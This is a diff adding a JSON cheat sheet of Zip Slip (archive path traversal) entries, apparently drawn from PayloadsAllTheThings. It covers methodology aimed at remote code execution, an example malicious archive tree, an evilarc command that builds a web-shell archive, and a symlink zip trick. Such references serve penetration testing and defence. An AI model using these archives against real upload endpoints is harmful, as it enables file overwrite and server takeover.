@@ -1,0 +1,41 @@
+{
+  "category": "Zip Slip",
+  "source": "PayloadsAllTheThings/Zip Slip/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What Zip Slip is and where to look",
+      "language": "text",
+      "tags": ["zip-slip", "methodology"],
+      "body": "An archive with traversal names (../../shell.php) writes files OUTSIDE the target folder on extraction -> overwrite and RCE.\nWhere to look: any archive import/upload (zip, tar, jar, war, cpio, apk, rar, 7z) that the server later extracts.\nGoal: overwrite an executable/config file and wait for it to be invoked (or invoke it yourself)."
+    },
+    {
+      "subcategory": "Archive structure",
+      "title": "Example of a malicious archive (traversal names)",
+      "language": "text",
+      "tags": ["zip-slip", "traversal"],
+      "body": "malicious.zip\n  ├── ../../../../etc/passwd\n  └── ../../../../usr/local/bin/malicious_script.sh"
+    },
+    {
+      "subcategory": "Building the archive",
+      "title": "evilarc — archive with traversal",
+      "language": "bash",
+      "tags": ["zip-slip", "evilarc", "tool"],
+      "body": "python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15"
+    },
+    {
+      "subcategory": "Building the archive",
+      "title": "ZIP with a symlink",
+      "language": "bash",
+      "tags": ["zip-slip", "symlink"],
+      "body": "ln -s ../../../index.php symindex.txt\nzip --symlinks test.zip symindex.txt"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Tools",
+      "language": "text",
+      "tags": ["zip-slip", "tools"],
+      "body": "evilarc — tar/zip with directory traversal.\nslipit (usdAG) — ZipSlip archive generator.\nList of vulnerable libraries/projects: snyk/zip-slip-vulnerability."
+    }
+  ]
+}
